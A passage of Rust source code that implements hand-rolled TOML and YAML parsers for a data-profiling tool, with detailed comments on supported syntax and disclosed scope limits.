                            "malformed TOML: cannot use dotted keys to add to an already-defined table '{seg}'"
                        );
                    }
                    t.dotted_owned = true;
                    cur = t;
                }
                TomlNode::ArrayOfTables(_) => {
                    bail!(
                        "malformed TOML: cannot use dotted keys to reach into an array of tables '{seg}'"
                    );
                }
                TomlNode::Value(_) => {
                    bail!("malformed TOML: '{seg}' is already defined and is not a table");
                }
            }
        }
        Ok(())
    }

    /// Resolves (creating implicit ancestors as needed) the table a
    /// `[header]` or `[[header]]` line names, per the walking rules
    /// `set_dotted` documents (header paths may pass through explicit
    /// ancestors freely - that's the standard "supertable defined
    /// afterward" / nested-subtable pattern).
    fn resolve_table_path<'t>(
        root: &'t mut TomlTable,
        path: &[String],
    ) -> Result<&'t mut TomlTable> {
        let mut cur = root;
        for seg in path {
            let exists = cur.get(seg).is_some();
            if !exists {
                cur.entries
                    .push((seg.clone(), TomlNode::Table(TomlTable::default())));
            }
            match cur.get_mut(seg).unwrap() {
                TomlNode::Table(t) => cur = t,
                TomlNode::ArrayOfTables(elems) => {
                    cur = elems
                        .last_mut()
                        .context("malformed TOML: empty array of tables")?;
                }
                TomlNode::Value(_) => {
                    bail!("malformed TOML: '{seg}' is already defined and is not a table")
                }
            }
        }
        Ok(cur)
    }

    fn define_table_header(root: &mut TomlTable, path: &[String]) -> Result<()> {
        let (last, ancestors) = path
            .split_last()
            .context("malformed TOML: empty table header")?;
        let parent = resolve_table_path(root, ancestors)?;
        match parent.get_mut(last) {
            None => {
                parent.entries.push((
                    last.clone(),
                    TomlNode::Table(TomlTable {
                        via_header: true,
                        ..TomlTable::default()
                    }),
                ));
            }
            Some(TomlNode::Table(t)) => {
                if t.via_header || t.dotted_owned {
                    bail!("malformed TOML: table '{}' redefined", path.join("."));
                }
                t.via_header = true;
            }
            Some(_) => bail!(
                "malformed TOML: '{}' is already defined and is not a table",
                path.join(".")
            ),
        }
        Ok(())
    }

    fn define_array_of_tables_header(root: &mut TomlTable, path: &[String]) -> Result<()> {
        let (last, ancestors) = path
            .split_last()
            .context("malformed TOML: empty table header")?;
        let parent = resolve_table_path(root, ancestors)?;
        match parent.get_mut(last) {
            None => {
                parent.entries.push((
                    last.clone(),
                    TomlNode::ArrayOfTables(vec![TomlTable {
                        via_header: true,
                        ..TomlTable::default()
                    }]),
                ));
            }
            Some(TomlNode::ArrayOfTables(elems)) => {
                elems.push(TomlTable {
                    via_header: true,
                    ..TomlTable::default()
                });
            }
            Some(_) => bail!(
                "malformed TOML: '{}' is already defined and is not an array of tables",
                path.join(".")
            ),
        }
        Ok(())
    }

    // -----------------------------------------------------------------
    // Document driver
    // -----------------------------------------------------------------

    fn parse_document(text: &str) -> Result<JsonValue> {
        let text = text.strip_prefix('\u{FEFF}').unwrap_or(text);
        let mut p = P::new(text);
        let mut root = TomlTable::default();
        // The table `key = value` lines currently append to, named by
        // its full path from the root - re-resolved fresh each time
        // it's needed (rather than holding a live `&mut` across loop
        // iterations, which the borrow checker can't reconcile with
        // `root` also being mutated by header lines in between) since a
        // TOML document's header-switch frequency makes the O(depth)
        // re-walk cost negligible.
        let mut current_path: Vec<String> = Vec::new();

        p.skip_ws_comments_newlines()?;
        while !p.eof() {
            if p.starts_with("[[") {
                p.pos += 2;
                p.skip_ws();
                let path = p.parse_dotted_key()?;
                p.skip_ws();
                if !p.starts_with("]]") {
                    bail!("malformed TOML: expected ']]'");
                }
                p.pos += 2;
                define_array_of_tables_header(&mut root, &path)?;
                current_path = path;
                p.expect_newline_or_eof()?;
            } else if p.peek() == Some('[') {
                p.bump();
                p.skip_ws();
                let path = p.parse_dotted_key()?;
                p.skip_ws();
                if p.peek() != Some(']') {
                    bail!("malformed TOML: expected ']'");
                }
                p.bump();
                define_table_header(&mut root, &path)?;
                current_path = path;
                p.expect_newline_or_eof()?;
            } else {
                let path = p.parse_dotted_key()?;
                p.skip_ws();
                if p.bump() != Some('=') {
                    bail!("malformed TOML: expected '='");
                }
                p.skip_ws();
                let value = p.parse_value()?;
                let cur = resolve_table_path(&mut root, &current_path)?;
                set_dotted(cur, &path, TomlNode::Value(value))?;
                p.expect_newline_or_eof()?;
            }
            p.skip_ws_comments_newlines()?;
        }

        Ok(table_to_json(&root))
    }

    pub(crate) fn columns_from_toml(path: &Path, n_samples: usize) -> Result<Vec<ColumnProfile>> {
        let content =
            fs::read_to_string(path).with_context(|| format!("failed to read {path:?}"))?;
        let value = parse_document(&content)
            .with_context(|| format!("failed to parse {path:?} as TOML"))?;
        let record = match value {
            JsonValue::Object(m) => m,
            _ => bail!("expected a TOML document with top-level key-value pairs in {path:?}"),
        };
        Ok(profile_json_records(&[record], n_samples))
    }
} // mod toml_support

#[cfg(feature = "toml")]
fn columns_from_toml(path: &Path, n_samples: usize) -> Result<Vec<ColumnProfile>> {
    toml_support::columns_from_toml(path, n_samples)
}

#[cfg(not(feature = "toml"))]
fn columns_from_toml(_path: &Path, _n_samples: usize) -> Result<Vec<ColumnProfile>> {
    bail!(
        "TOML support isn't compiled in - rebuild with `cargo build --release --features toml` (or --features full)"
    )
}
// --- YAML reader (opt-in via --features yaml, hand-rolled - see
// `yaml_support` below and CLAUDE.md's Dependency footprint section for
// the full writeup, including the real, disclosed scope boundaries this
// parser draws) ---
// YAML has three shapes a data file commonly takes, so the record list is
// built differently depending on what's actually in the file rather than
// assuming one: a single top-level sequence is an array of records (like
// JSON's `[...]` mode); a single top-level mapping is one record (the
// whole document is the row - the same choice TOML makes for its own
// single-document format); a `---`-separated multi-document stream is one
// record per document (YAML's own equivalent of JSON Lines).

/// A from-scratch YAML 1.1/1.2-flavored parser producing `serde_json::Value`
/// directly (no intermediate YAML-specific value type - unlike every other
/// nested-format bridge in this file, there's no ready-made dynamic Value
/// type to reuse here since the dependency being replaced *was* that type).
///
/// Deliberately scoped to the block/flow structural surface real-world YAML
/// data files overwhelmingly use, the same "confident common case, disclosed
/// gap on the rest" discipline as every other hand-rolled reader in this
/// project - this project's own former `serde_norway`-based reader already
/// only passed ~74% of the `yaml-test-suite` spec-compliance corpus (see
/// CLAUDE.md's real-world-corpus-validation writeup), so 100% spec fidelity
/// was never the bar being matched. Supported: block and flow mappings/
/// sequences at arbitrary nesting depth, an inline value/nested structure
/// immediately after `- `/`key: ` (`- key: value`, `- - a`, `key: [1, 2]`,
/// ...), plain/single-quoted/double-quoted scalars (with double-quote's
/// full backslash-escape grammar, including `\xNN`/`\uNNNN`/`\UNNNNNNNN`),
/// a folded multi-line plain scalar, literal (`|`) and folded (`>`) block
/// scalars with `-`/`+` chomping and an explicit indentation indicator,
/// `#` comments (respecting quote state), multi-document `---`/`...`
/// streams, leading `%`-directives (skipped), and YAML 1.2's core-schema
/// null/bool/int/float resolution for plain scalars (deliberately *not*
/// YAML 1.1's `yes`/`no`/`on`/`off` boolean words - matching this crate's
/// own predecessor, `serde_yaml`, whose maintained fork is literally named
/// `serde_norway` after the classic "Norway problem" of `NO` silently
/// resolving to `false`; not regressing that fix was a real, checked
/// design constraint here, not an incidental choice).
///
/// An anchor's own value (`key: &name ...`) is read completely normally,
/// with the tag itself just stripped (`strip_anchor_prefix`) since it
/// carries no information this project's type-detection heuristics need,
/// but *dereferencing* it elsewhere via an alias (`*name`) or a merge
/// key (`<<: *name`) is deliberately out of scope, and produces a clear,
/// disclosed error rather than a silent guess (see
/// `resolve_plain_scalar`'s own check) - the alternative, found via real-
/// world validation before this split was made, was silent data loss:
/// the anchor's *own* content was misread as a literal string, and the
/// block it should have introduced was orphaned entirely. Also
/// deliberately out of scope, on the same "disclosed gap, not a guess"
/// footing: explicit complex mapping keys (`? key\n: value`), and any
/// custom YAML tag beyond a best-effort strip-and-parse-the-rest (the
/// five `!!core` tags - `str`/`int`/`float`/`bool`/`null` - *are*
/// honored, forcing that exact interpretation rather than guessing). A
/// document boundary (`---`/`...`) is detected via a single flat
/// pre-pass before structural parsing begins, so a block scalar whose
/// own literal content happens to contain a line that's exactly `---`
/// would be mis-split - a narrow, accepted edge case rather than
/// something worth a fully-integrated single-pass state machine to
/// close.
#[cfg(feature = "yaml")]
mod yaml_support {
    use super::*;

    #[derive(Clone, Copy)]
    struct YLine<'a> {
        indent: usize,
        raw: &'a str,
        num: usize,
    }

    fn split_lines(text: &str) -> Result<Vec<YLine<'_>>> {
        let mut out = Vec::new();
        for (i, line) in text.lines().enumerate() {
            let line = line.strip_suffix('\r').unwrap_or(line);
            let trimmed = line.trim_start_matches(' ');
            if line.starts_with('\t') && !line.trim().is_empty() {
                bail!("YAML doesn't allow tabs for indentation (line {})", i + 1);
            }
            let indent = line.len() - trimmed.len();
            out.push(YLine {
                indent,
                raw: trimmed,
                num: i + 1,
            });
        }
        Ok(out)
    }

    fn is_blank_or_comment(raw: &str) -> bool {
        raw.is_empty() || raw.starts_with('#')
    }

    /// Strips a trailing `# comment` from a single structural line,
    /// honoring quote state (a `#` inside a quoted scalar is never a
    /// comment) - never applied to a block scalar's own verbatim body,
    /// where `#` is always literal content.
    fn strip_comment(s: &str) -> &str {
        let mut in_single = false;
        let mut in_double = false;
        let mut prev_is_space = true;
        let mut chars = s.char_indices().peekable();
        while let Some((i, c)) = chars.next() {
            if in_double {
                if c == '\\' {
                    chars.next();
                } else if c == '"' {
                    in_double = false;
                }
                prev_is_space = false;
                continue;
            }
            if in_single {
                if c == '\'' {
                    if chars.peek().map(|&(_, c2)| c2) == Some('\'') {
                        chars.next();
                        prev_is_space = false;
                        continue;
                    }
                    in_single = false;
                }
                prev_is_space = false;
                continue;
            }
            match c {
                '"' => {
                    in_double = true;
                    prev_is_space = false;
                }
                '\'' => {
                    in_single = true;
                    prev_is_space = false;
                }
                '#' if prev_is_space => return s[..i].trim_end(),
                ' ' | '\t' => prev_is_space = true,
                _ => prev_is_space = false,
            }
        }
        s.trim_end()
    }

    fn is_sequence_item_line(s: &str) -> bool {
        s == "-" || s.starts_with("- ")
    }

    /// Is `l` the start of a nested block value for a key/dash whose own
    /// indentation is `parent_indent`? Ordinarily this just means
    /// "more indented than the parent" - but YAML block sequences are a
    /// real, explicit exception: `key:\n- item` (the sequence at the
    /// *same* indentation as its own key, not more) is legal and, in
    /// practice, a common real-world style (found via a real Kubernetes
    /// manifest during validation - `containers:` followed by `- name:
    /// ...` at identical indentation). A same-indent *mapping* key is
    /// not given this exception (that would be genuinely ambiguous), so
    /// this only fires for a same-indent line that's itself a sequence
    /// item.
    fn is_nested_value_line(l: &YLine, parent_indent: usize) -> bool {
        if l.indent > parent_indent {
            return true;
        }
        l.indent == parent_indent && is_sequence_item_line(strip_comment(l.raw).trim_end())
    }

    /// Strips a leading `&anchor` token, if present, from the start of a
    /// value. Anchors (`&name`) and aliases (`*name`) are, as a pair, out
    /// of this parser's declared scope (see the module's own doc
    /// comment) - but *defining* an anchor and *dereferencing* it later
    /// are different-sized problems: the anchor token itself carries no
    /// information this project's own type-detection heuristics need
    /// (it's metadata *about* the value, not part of the value), so
    /// simply discarding it and reading the value it's attached to
    /// normally is correct and free - no anchor-table bookkeeping
    /// required. An `*alias` reference is the genuinely unsupported
    /// half (see `resolve_plain_scalar`'s own check) - a real, checked
    /// finding: an early version of this parser stripped nothing, so
    /// `key: &anchor` silently became the literal string `"&anchor"`
    /// (and, worse, orphaned every line of the block it should have
    /// introduced) rather than reading the anchored value at all -
    /// confirmed against a real anchors-and-merge-keys fixture before
    /// this fix, not assumed. Returns the remaining text and how many
    /// characters were consumed (name plus trailing whitespace), so a
    /// caller computing a column offset can adjust for it.
    fn strip_anchor_prefix(s: &str) -> (&str, usize) {
        let Some(rest) = s.strip_prefix('&') else {
            return (s, 0);
        };
        let name_end = rest.find(char::is_whitespace).unwrap_or(rest.len());
        let after_name = &rest[name_end..];
        let trimmed = after_name.trim_start();
        (trimmed, s.len() - trimmed.len())
    }

    /// Finds the byte offset of the `:` that separates a block mapping
    /// key from its value: the first colon, outside any quote and outside
    /// any flow (`{}`/`[]`) nesting, immediately followed by whitespace or
    /// end-of-string - the same rule that keeps `http://example.com` or
    /// `time: 12:30`'s embedded colons from being misread as key
    /// separators.
    fn find_mapping_colon(s: &str) -> Option<usize> {
        let mut in_single = false;
        let mut in_double = false;
        let mut flow_depth = 0i32;
        let mut chars = s.char_indices().peekable();
        while let Some((i, c)) = chars.next() {
            if in_double {
                if c == '\\' {
                    chars.next();
                } else if c == '"' {
                    in_double = false;
                }
                continue;
            }
            if in_single {
                if c == '\'' {
                    if chars.peek().map(|&(_, c2)| c2) == Some('\'') {
                        chars.next();
                        continue;
                    }
                    in_single = false;
                }
                continue;
            }
            match c {
                '"' => in_double = true,
                '\'' => in_single = true,
                '{' | '[' => flow_depth += 1,
                '}' | ']' => flow_depth -= 1,
                ':' if flow_depth == 0 => {
                    let next = chars.peek().map(|&(_, c2)| c2);
                    if next.is_none() || next == Some(' ') || next == Some('\t') {
                        return Some(i);
                    }
                }
                _ => {}
            }
        }
        None
    }

    fn skip_blank_and_comment_lines(lines: &[YLine], pos: &mut usize) {
        while let Some(l) = lines.get(*pos) {
            if is_blank_or_comment(strip_comment(l.raw)) {
                *pos += 1;
            } else {
                break;
            }
        }
    }

    /// Splits raw YAML text into top-level documents (`---`-separated,
    /// with an optional `...` end marker and optional leading
    /// `%`-directives), then parses each into a `JsonValue`.
    pub(crate) fn parse_yaml_documents(text: &str) -> Result<Vec<JsonValue>> {
        let lines = split_lines(text)?;
        let mut docs = Vec::new();
        let mut i = 0usize;
        while i < lines.len() && lines[i].raw.starts_with('%') {
            i += 1;
        }
        loop {
            while i < lines.len() && is_blank_or_comment(strip_comment(lines[i].raw)) {
                i += 1;
            }
            if i >= lines.len() {
                break;
            }
            let mut doc_lines: Vec<YLine> = Vec::new();
            if lines[i].raw == "---" || lines[i].raw.starts_with("--- ") {
                let inline = lines[i].raw.strip_prefix("---").unwrap().trim_start();
                if !inline.is_empty() {
                    doc_lines.push(YLine {
                        indent: 0,
                        raw: inline,
                        num: lines[i].num,
                    });
                }
                i += 1;
            }
            while i < lines.len() {
                let l = lines[i];
                if l.indent == 0 && (l.raw == "---" || l.raw.starts_with("--- ") || l.raw == "...")
                {
                    break;
                }
                doc_lines.push(l);
                i += 1;
            }
            if lines.get(i).map(|l| l.raw == "...").unwrap_or(false) {
                i += 1;
            }
            let mut pos = 0usize;
            let value = parse_document(&doc_lines, &mut pos)?;
            docs.push(value);
        }
        Ok(docs)
    }

    fn parse_document(lines: &[YLine], pos: &mut usize) -> Result<JsonValue> {
        skip_blank_and_comment_lines(lines, pos);
        if *pos >= lines.len() {
            return Ok(JsonValue::Null);
        }
        let indent = lines[*pos].indent;
        parse_block_node(lines, pos, indent, indent)
    }

    /// `indent` is the structural gate - what a sibling key/item at this
    /// level must match. `parent_indent` is what a *scalar*'s own
    /// continuation lines (a folded plain scalar, or a block scalar's
    /// body) are measured against instead - these normally coincide, but
    /// diverge for a value inline right after `- `/`key: `, where
    /// `indent` becomes that inline value's own re-anchored column (so a
    /// nested mapping/sequence's *later* keys/items align to it) while
    /// `parent_indent` stays the enclosing key/dash's real indentation
    /// (what YAML's own multi-line-scalar rules actually measure against
    /// - see `parse_inline_value`, where the two are first split apart).
    fn parse_block_node(
        lines: &[YLine],
        pos: &mut usize,
        indent: usize,
        parent_indent: usize,
    ) -> Result<JsonValue> {
        skip_blank_and_comment_lines(lines, pos);
        let Some(line) = lines.get(*pos) else {
            return Ok(JsonValue::Null);
        };
        if line.indent < indent {
            return Ok(JsonValue::Null);
        }
        if line.indent > indent {
            bail!(
                "unexpected indentation at line {} (expected {} leading spaces, found {})",
                line.num,
                indent,
                line.indent
            );
        }
        let content = strip_comment(line.raw).trim_end();
        if content.is_empty() {
            *pos += 1;
            return Ok(JsonValue::Null);
        }
        if is_sequence_item_line(content) {
            parse_block_sequence(lines, pos, indent)
        } else if find_mapping_colon(content).is_some() {
            parse_block_mapping(lines, pos, indent)
        } else {
            parse_scalar_or_flow(lines, pos, parent_indent)
        }
    }

    /// Re-anchors an inline value (the text right after `- ` or `key: `)
    /// as a synthetic line at the column it actually starts on, then
    /// delegates to `parse_block_node` - this uniformly handles a plain/
    /// quoted scalar, a flow collection, or an inline nested mapping/
    /// sequence whose later keys/items are indented to match that same
    /// column, without duplicating any of `parse_block_node`'s own logic.
    /// `parent_indent` is the enclosing key/dash's *own* real
    /// indentation (passed straight through to `parse_block_node`,
    /// unlike the synthetic `value_col` used as the structural `indent` -
    /// see `parse_block_node`'s own doc comment for why the two must
    /// stay separate). Returns the parsed value and how many *real*
    /// lines (starting at `at`) were consumed.
    fn parse_inline_value<'a>(
        lines: &[YLine<'a>],
        at: usize,
        inline: &'a str,
        value_col: usize,
        parent_indent: usize,
    ) -> Result<(JsonValue, usize)> {
        let synthetic = YLine {
            indent: value_col,
            raw: inline,
            num: lines[at].num,
        };
        let mut sub_lines: Vec<YLine<'a>> = Vec::with_capacity(1 + lines.len() - at - 1);
        sub_lines.push(synthetic);
        sub_lines.extend_from_slice(&lines[at + 1..]);
        let mut sub_pos = 0usize;
        let value = parse_block_node(&sub_lines, &mut sub_pos, value_col, parent_indent)?;
        Ok((value, sub_pos.max(1)))
    }

    fn parse_block_sequence(lines: &[YLine], pos: &mut usize, indent: usize) -> Result<JsonValue> {
        let mut items = Vec::new();
        loop {
            skip_blank_and_comment_lines(lines, pos);
            let Some(line) = lines.get(*pos) else { break };
            if line.indent != indent {
                break;
            }
            let content = strip_comment(line.raw).trim_end();
            if !is_sequence_item_line(content) {
                break;
            }
            let after_dash_raw = &content[1..];
            let trimmed_len = after_dash_raw.len() - after_dash_raw.trim_start().len();
            let (after_dash, anchor_consumed) = strip_anchor_prefix(after_dash_raw.trim_start());
            let value_col = line.indent + 1 + trimmed_len + anchor_consumed;
            if after_dash.is_empty() {
                *pos += 1;
                skip_blank_and_comment_lines(lines, pos);
                match lines.get(*pos) {
                    Some(l) if is_nested_value_line(l, indent) => {
                        let child_indent = l.indent;
                        items.push(parse_block_node(lines, pos, child_indent, child_indent)?);
                    }
                    _ => items.push(JsonValue::Null),
                }
            } else {
                let (value, consumed) =
                    parse_inline_value(lines, *pos, after_dash, value_col, line.indent)?;
                items.push(value);
                *pos += consumed;
            }
        }
        Ok(JsonValue::Array(items))
    }

    fn parse_block_mapping(lines: &[YLine], pos: &mut usize, indent: usize) -> Result<JsonValue> {
        let mut map = serde_json::Map::new();
        loop {
            skip_blank_and_comment_lines(lines, pos);
            let Some(line) = lines.get(*pos) else { break };
            if line.indent != indent {
                break;
            }
            let content = strip_comment(line.raw).trim_end();
            let Some(colon) = find_mapping_colon(content) else {
                break;
            };
            let key = resolve_scalar_key(content[..colon].trim())?;
            let after_colon_raw = &content[colon + 1..];
            let trimmed_len = after_colon_raw.len() - after_colon_raw.trim_start().len();
            let (after_colon, anchor_consumed) = strip_anchor_prefix(after_colon_raw.trim_start());
            let value_col = line.indent + colon + 1 + trimmed_len + anchor_consumed;
            if after_colon.is_empty() {
                *pos += 1;
                skip_blank_and_comment_lines(lines, pos);
                match lines.get(*pos) {
                    Some(l) if is_nested_value_line(l, indent) => {
                        let child_indent = l.indent;
                        let value = parse_block_node(lines, pos, child_indent, child_indent)?;
                        map.insert(key, value);
                    }
                    _ => {
                        map.insert(key, JsonValue::Null);
                    }
                }
            } else {
                let (value, consumed) =
                    parse_inline_value(lines, *pos, after_colon, value_col, line.indent)?;
                map.insert(key, value);
                *pos += consumed;
            }
        }
        Ok(JsonValue::Object(map))
    }

    fn parse_scalar_or_flow(
        lines: &[YLine],
        pos: &mut usize,
        parent_indent: usize,
    ) -> Result<JsonValue> {
        let line = lines[*pos];
        let content = strip_comment(line.raw).trim_end();
        if let Some(rest) = content
            .strip_prefix('|')
            .or_else(|| content.strip_prefix('>'))
        {
            let style = content.chars().next().unwrap();
            return parse_block_scalar(lines, pos, parent_indent, style, rest);
        }
        if content.starts_with('{') || content.starts_with('[') {
            return parse_flow_from_lines(lines, pos);
        }
        if content.starts_with('"') || content.starts_with('\'') {
            *pos += 1;
            return resolve_scalar_value(content);
        }
        // A plain (unquoted) scalar can fold across subsequent
        // more-indented lines (YAML's multi-line plain scalar rule).
        // Once folded, the combined text is always a String - a real,
        // multi-word plain scalar can never validly resolve to
        // null/bool/int/float anyway.
        let mut parts = vec![content.to_string()];
        *pos += 1;
        while let Some(l) = lines.get(*pos) {
            if l.raw.is_empty() {
                *pos += 1;
                continue;
            }
            if l.indent <= parent_indent {
                break;
            }
            let c = strip_comment(l.raw).trim_end();
            if c.is_empty() {
                *pos += 1;
                continue;
            }
            if is_sequence_item_line(c) || find_mapping_colon(c).is_some() {
                break;
            }
            parts.push(c.to_string());
            *pos += 1;
        }
        if parts.len() == 1 {
            resolve_scalar_value(&parts[0])
        } else {
            Ok(JsonValue::String(parts.join(" ")))
        }
    }

    /// A literal (`|`) or folded (`>`) block scalar. `header_rest` is
    /// whatever followed the style character on the header line - a
    /// chomping indicator (`-` strip, `+` keep, default clip: exactly one
    /// trailing newline) and/or an explicit indentation-level digit, in
    /// either order, per [YAML 1.2 §8.1.1]. "Keep" chomping is
    /// approximated as clip (a disclosed simplification - preserving
    /// every last trailing blank line exactly is the rarest of the three
    /// modes in real-world use).
    fn parse_block_scalar(
        lines: &[YLine],
        pos: &mut usize,
        parent_indent: usize,
        style: char,
        header_rest: &str,
    ) -> Result<JsonValue> {
        let mut chomp = '=';
        let mut explicit_indent: Option<usize> = None;
        for c in header_rest.trim().chars() {
            match c {
                '-' => chomp = '-',
                '+' => chomp = '+',
                '0'..='9' => explicit_indent = Some(c as usize - '0' as usize),
                _ => {}
            }
        }
        *pos += 1;
        let mut body: Vec<(usize, &str)> = Vec::new();
        while let Some(l) = lines.get(*pos) {
            if l.raw.is_empty() {
                body.push((usize::MAX, ""));
                *pos += 1;
                continue;
            }
            if l.indent <= parent_indent {
                break;
            }
            body.push((l.indent, l.raw));
            *pos += 1;
        }
        while matches!(body.last(), Some(&(usize::MAX, _))) {
            body.pop();
        }
        let base_indent = explicit_indent
            .map(|n| parent_indent + n)
            .or_else(|| {
                body.iter()
                    .find(|&&(i, _)| i != usize::MAX)
                    .map(|&(i, _)| i)
            })
            .unwrap_or(parent_indent + 1);
        let mut out_lines: Vec<String> = Vec::with_capacity(body.len());
        for (indent, raw) in &body {
            if *indent == usize::MAX {
                out_lines.push(String::new());
            } else {
                let pad = indent.saturating_sub(base_indent);
                out_lines.push(format!("{}{}", " ".repeat(pad), raw));
            }
        }
        let mut text = if style == '|' {
            out_lines.join("\n")
        } else {
            fold_block_scalar(&out_lines)
        };
        if !body.is_empty() && chomp != '-' {
            text.push('\n');
        }
        Ok(JsonValue::String(text))
    }

    /// YAML folding: consecutive non-blank lines join with a single
    /// space; a blank line becomes a literal newline. Doesn't special-
    /// case a more-indented line staying literal (a real but rarer
    /// folding nuance) - a disclosed simplification.
    fn fold_block_scalar(lines: &[String]) -> String {
        let mut out = String::new();
        let mut prev_blank = true;
        for l in lines {
            if l.is_empty() {
                out.push('\n');
                prev_blank = true;
            } else {
                if !prev_blank {
                    out.push(' ');
                }
                out.push_str(l);
                prev_blank = false;
            }
        }
        out
    }

    /// Joins every remaining line in this document (raw, unstripped -
    /// the flow parser below understands `#` comments itself) starting
    /// at `*pos`, parses one flow value from the front of it, then
    /// figures out how many whole lines that consumed by counting
    /// newlines in the consumed prefix - flow collections aren't
    /// indentation-sensitive, so they're free to span physical lines.
    fn parse_flow_from_lines(lines: &[YLine], pos: &mut usize) -> Result<JsonValue> {
        let start = *pos;
        let mut joined = String::new();
        for l in &lines[start..] {
            if !joined.is_empty() {
                joined.push('\n');
            }
            joined.push_str(l.raw);
        }
        let mut cursor = 0usize;
        let value = parse_flow_value(&joined, &mut cursor)?;
        let consumed_lines = joined[..cursor].matches('\n').count();
        *pos = start + consumed_lines + 1;
        Ok(value)
    }

    fn skip_flow_ws(s: &str, cursor: &mut usize) {
        loop {
            let rest = &s[*cursor..];
            match rest.chars().next() {
                Some(c) if c.is_whitespace() => *cursor += c.len_utf8(),
                Some('#') => {
                    *cursor += rest.find('\n').unwrap_or(rest.len());
                }
                _ => break,
            }
        }
    }

    fn parse_flow_value(s: &str, cursor: &mut usize) -> Result<JsonValue> {
        skip_flow_ws(s, cursor);
        match s[*cursor..].chars().next() {
            Some('{') => parse_flow_mapping(s, cursor),
            Some('[') => parse_flow_sequence(s, cursor),
            Some('"') => Ok(JsonValue::String(parse_double_quoted(s, cursor)?)),
            Some('\'') => Ok(JsonValue::String(parse_single_quoted(s, cursor)?)),
            Some(_) => {
                let raw = read_flow_plain_scalar(s, cursor);
                resolve_scalar_value(raw.trim())
            }
            None => bail!("unexpected end of input while parsing a YAML flow value"),
        }
    }

    fn read_flow_plain_scalar<'a>(s: &'a str, cursor: &mut usize) -> &'a str {
        let start = *cursor;
        let mut prev_space = false;
        loop {
            let rest = &s[*cursor..];
            let Some(c) = rest.chars().next() else { break };
            match c {
                ',' | '}' | ']' => break,
                ':' => {
                    let after = &rest[c.len_utf8()..];
                    let next = after.chars().next();
                    if matches!(next, None | Some(' ' | '\t' | ',' | '}' | ']' | '\n')) {
                        break;
                    }
                    *cursor += c.len_utf8();
                    prev_space = false;
                }
                '#' if prev_space => break,
                _ => {
                    prev_space = c == ' ' || c == '\t';
                    *cursor += c.len_utf8();
                }
            }
        }
        s[start..*cursor].trim_end()
    }

    fn parse_flow_sequence(s: &str, cursor: &mut usize) -> Result<JsonValue> {
        *cursor += 1;
        let mut items = Vec::new();
        loop {
            skip_flow_ws(s, cursor);
            match s[*cursor..].chars().next() {
                Some(']') => {
                    *cursor += 1;
                    break;
                }
                None => bail!("unterminated YAML flow sequence"),
                _ => {}
            }
            items.push(parse_flow_value(s, cursor)?);
            skip_flow_ws(s, cursor);
            match s[*cursor..].chars().next() {
                Some(',') => *cursor += 1,
                Some(']') => {
                    *cursor += 1;
                    break;
                }
                _ => bail!("expected ',' or ']' in YAML flow sequence"),
            }
        }
        Ok(JsonValue::Array(items))
    }

    fn parse_flow_mapping(s: &str, cursor: &mut usize) -> Result<JsonValue> {
        *cursor += 1;
        let mut map = serde_json::Map::new();
        loop {
            skip_flow_ws(s, cursor);
            match s[*cursor..].chars().next() {
                Some('}') => {
                    *cursor += 1;
                    break;
                }
                None => bail!("unterminated YAML flow mapping"),
                _ => {}
            }
            let key_val = parse_flow_value(s, cursor)?;
            let key = match key_val {
                JsonValue::String(s2) => s2,
                other => other.to_string(),
            };
            skip_flow_ws(s, cursor);
            let mut value = JsonValue::Null;
            if s[*cursor..].starts_with(':') {
                *cursor += 1;
                value = parse_flow_value(s, cursor)?;
            }
            map.insert(key, value);
            skip_flow_ws(s, cursor);
            match s[*cursor..].chars().next() {
                Some(',') => *cursor += 1,
                Some('}') => {
                    *cursor += 1;
                    break;
                }
                _ => bail!("expected ',' or '}}' in YAML flow mapping"),
            }
        }
        Ok(JsonValue::Object(map))
    }

    fn parse_double_quoted(s: &str, cursor: &mut usize) -> Result<String> {
        *cursor += 1;
        let mut out = String::new();
        loop {
            let rest = &s[*cursor..];
            let Some(c) = rest.chars().next() else {
                bail!("unterminated double-quoted YAML string");
            };
            *cursor += c.len_utf8();
            match c {
                '"' => return Ok(out),
                '\\' => {
                    let rest2 = &s[*cursor..];
                    let Some(esc) = rest2.chars().next() else {
                        bail!("unterminated escape sequence in double-quoted YAML string");
                    };
                    *cursor += esc.len_utf8();
                    match esc {
                        'n' => out.push('\n'),
                        't' => out.push('\t'),
                        'r' => out.push('\r'),
                        '"' => out.push('"'),
                        '\\' => out.push('\\'),
                        '/' => out.push('/'),
                        '0' => out.push('\0'),
                        'a' => out.push('\u{7}'),
                        'b' => out.push('\u{8}'),
                        'f' => out.push('\u{C}'),
                        'v' => out.push('\u{B}'),
                        'e' => out.push('\u{1B}'),
                        ' ' => out.push(' '),
                        'N' => out.push('\u{85}'),
                        '_' => out.push('\u{A0}'),
                        'L' => out.push('\u{2028}'),
                        'P' => out.push('\u{2029}'),
                        '\n' => {}
                        'x' => out.push(read_hex_escape(s, cursor, 2)?),
                        'u' => out.push(read_hex_escape(s, cursor, 4)?),
                        'U' => out.push(read_hex_escape(s, cursor, 8)?),
                        other => {
                            bail!(
                                "unrecognized escape sequence '\\{other}' in YAML double-quoted string"
                            )
                        }
                    }
                }
                _ => out.push(c),
            }
        }
    }

    fn read_hex_escape(s: &str, cursor: &mut usize, digits: usize) -> Result<char> {
        let rest = &s[*cursor..];
        let hex: String = rest.chars().take(digits).collect();
        if hex.chars().count() != digits {
            bail!("truncated hex escape in YAML double-quoted string");
        }
        let code = u32::from_str_radix(&hex, 16)
            .context("invalid hex escape in YAML double-quoted string")?;
        *cursor += hex.len();
        char::from_u32(code)
            .ok_or_else(|| anyhow!("invalid unicode escape in YAML double-quoted string"))
    }

    fn parse_single_quoted(s: &str, cursor: &mut usize) -> Result<String> {
        *cursor += 1;
        let mut out = String::new();
        loop {
            let rest = &s[*cursor..];
            let Some(c) = rest.chars().next() else {
                bail!("unterminated single-quoted YAML string");
            };
            *cursor += c.len_utf8();
            if c == '\'' {
                if rest[1..].starts_with('\'') {
                    out.push('\'');
                    *cursor += 1;
                    continue;
                }
                return Ok(out);
            }
            out.push(c);
        }
    }

    fn resolve_scalar_key(raw: &str) -> Result<String> {
        Ok(match resolve_scalar_value(raw)? {
            JsonValue::String(s) => s,
            other => other.to_string(),
        })
    }

    /// Strips and unescapes quotes if `s` is quoted, else returns it
    /// unchanged - used by the `!!str`/`!!int`/`!!float`/`!!bool` tag
    /// branches below, since a forced-type tag can legally apply to an
    /// explicitly-quoted scalar too (e.g. `!!int "45"`), not just a
    /// plain one.
    fn unquote_if_quoted(s: &str) -> Result<String> {
        if s.starts_with('"') {
            let mut cursor = 0usize;
